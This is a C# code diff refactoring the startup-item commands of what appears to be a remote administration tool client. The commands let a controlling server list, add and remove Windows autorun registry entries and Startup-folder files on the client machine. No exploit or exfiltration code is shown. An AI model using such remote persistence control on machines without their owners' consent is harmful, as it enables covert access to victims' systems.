@@ -106,34 +106,50 @@ namespace xClient.Core.Commands
         {
             try
             {
-                List<string> startupItems = new List<string>();
+                List<StartupItem> startupItems = new List<StartupItem>();
 
                 using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
                 {
                     if (key != null)
                     {
-                        startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "0" + formattedKeyValue));
+                        foreach (var item in key.GetKeyValues())
+                        {
+                            startupItems.Add(new StartupItem
+                                {Name = item.Item1, Path = item.Item2, Type = StartupType.LocalMachineRun});
+                        }
                     }
                 }
                 using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                 {
                     if (key != null)
                     {
-                        startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "1" + formattedKeyValue));
+                        foreach (var item in key.GetKeyValues())
+                        {
+                            startupItems.Add(new StartupItem
+                                {Name = item.Item1, Path = item.Item2, Type = StartupType.LocalMachineRunOnce});
+                        }
                     }
                 }
                 using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
                 {
                     if (key != null)
                     {
-                        startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "2" + formattedKeyValue));
+                        foreach (var item in key.GetKeyValues())
+                        {
+                            startupItems.Add(new StartupItem
+                                {Name = item.Item1, Path = item.Item2, Type = StartupType.CurrentUserRun});
+                        }
                     }
                 }
                 using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                 {
                     if (key != null)
                     {
-                        startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "3" + formattedKeyValue));
+                        foreach (var item in key.GetKeyValues())
+                        {
+                            startupItems.Add(new StartupItem
+                                {Name = item.Item1, Path = item.Item2, Type = StartupType.CurrentUserRunOnce});
+                        }
                     }
                 }
                 if (PlatformHelper.Is64Bit)
@@ -142,14 +158,24 @@ namespace xClient.Core.Commands
                     {
                         if (key != null)
                         {
-                            startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "4" + formattedKeyValue));
+                            foreach (var item in key.GetKeyValues())
+                            {
+                                startupItems.Add(new StartupItem
+                                    {Name = item.Item1, Path = item.Item2, Type = StartupType.LocalMachineWoW64Run});
+                            }
                         }
                     }
                     using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                     {
                         if (key != null)
                         {
-                            startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "5" + formattedKeyValue));
+                            foreach (var item in key.GetKeyValues())
+                            {
+                                startupItems.Add(new StartupItem
+                                {
+                                    Name = item.Item1, Path = item.Item2, Type = StartupType.LocalMachineWoW64RunOnce
+                                });
+                            }
                         }
                     }
                 }
@@ -157,9 +183,10 @@ namespace xClient.Core.Commands
                 {
                     var files = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup)).GetFiles();
 
-                    startupItems.AddRange(from file in files where file.Name != "desktop.ini"
-                                          select string.Format("{0}||{1}", file.Name, file.FullName) into formattedKeyValue
-                                          select "6" + formattedKeyValue);
+                    startupItems.AddRange(from file in files
+                        where file.Name != "desktop.ini"
+                        select new StartupItem()
+                            {Name = file.Name, Path = file.FullName, Type = StartupType.StartMenu});
                 }
 
                 client.Send(new GetStartupItemsResponse {StartupItems = startupItems});
@@ -176,35 +203,35 @@ namespace xClient.Core.Commands
             {
                 switch (command.StartupItem.Type)
                 {
-                    case 0:
+                    case StartupType.LocalMachineRun:
                         if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                             "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.StartupItem.Name, command.StartupItem.Path, true))
                         {
                             throw new Exception("Could not add value");
                         }
                         break;
-                    case 1:
+                    case StartupType.LocalMachineRunOnce:
                         if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                             "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.StartupItem.Name, command.StartupItem.Path, true))
                         {
                             throw new Exception("Could not add value");
                         }
                         break;
-                    case 2:
+                    case StartupType.CurrentUserRun:
                         if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                             "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.StartupItem.Name, command.StartupItem.Path, true))
                         {
                             throw new Exception("Could not add value");
                         }
                         break;
-                    case 3:
+                    case StartupType.CurrentUserRunOnce:
                         if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                             "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.StartupItem.Name, command.StartupItem.Path, true))
                         {
                             throw new Exception("Could not add value");
                         }
                         break;
-                    case 4:
+                    case StartupType.LocalMachineWoW64Run:
                         if (!PlatformHelper.Is64Bit)
                             throw new NotSupportedException("Only on 64-bit systems supported");
 
@@ -214,7 +241,7 @@ namespace xClient.Core.Commands
                             throw new Exception("Could not add value");
                         }
                         break;
-                    case 5:
+                    case StartupType.LocalMachineWoW64RunOnce:
                         if (!PlatformHelper.Is64Bit)
                             throw new NotSupportedException("Only on 64-bit systems supported");
 
@@ -224,7 +251,7 @@ namespace xClient.Core.Commands
                             throw new Exception("Could not add value");
                         }
                         break;
-                    case 6:
+                    case StartupType.StartMenu:
                         if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
                         {
                             Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
@@ -254,58 +281,58 @@ namespace xClient.Core.Commands
         {
             try
             {
-                switch (command.Type)
+                switch (command.StartupItem.Type)
                 {
-                    case 0:
+                    case StartupType.LocalMachineRun:
                         if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
-                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
+                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.StartupItem.Name))
                         {
                             throw new Exception("Could not remove value");
                         }
                         break;
-                    case 1:
+                    case StartupType.LocalMachineRunOnce:
                         if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
-                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
+                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.StartupItem.Name))
                         {
                             throw new Exception("Could not remove value");
                         }
                         break;
-                    case 2:
+                    case StartupType.CurrentUserRun:
                         if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
-                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
+                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.StartupItem.Name))
                         {
                             throw new Exception("Could not remove value");
                         }
                         break;
-                    case 3:
+                    case StartupType.CurrentUserRunOnce:
                         if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
-                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
+                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.StartupItem.Name))
                         {
                             throw new Exception("Could not remove value");
                         }
                         break;
-                    case 4:
+                    case StartupType.LocalMachineWoW64Run:
                         if (!PlatformHelper.Is64Bit)
                             throw new NotSupportedException("Only on 64-bit systems supported");
 
                         if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
-                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
+                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.StartupItem.Name))
                         {
                             throw new Exception("Could not remove value");
                         }
                         break;
-                    case 5:
+                    case StartupType.LocalMachineWoW64RunOnce:
                         if (!PlatformHelper.Is64Bit)
                             throw new NotSupportedException("Only on 64-bit systems supported");
 
                         if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
-                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
+                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.StartupItem.Name))
                         {
                             throw new Exception("Could not remove value");
                         }
                         break;
-                    case 6:
-                        string startupItemPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), command.Name);
+                    case StartupType.StartMenu:
+                        string startupItemPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), command.StartupItem.Name);
 
                         if (!File.Exists(startupItemPath))
                             throw new IOException("File does not exist");
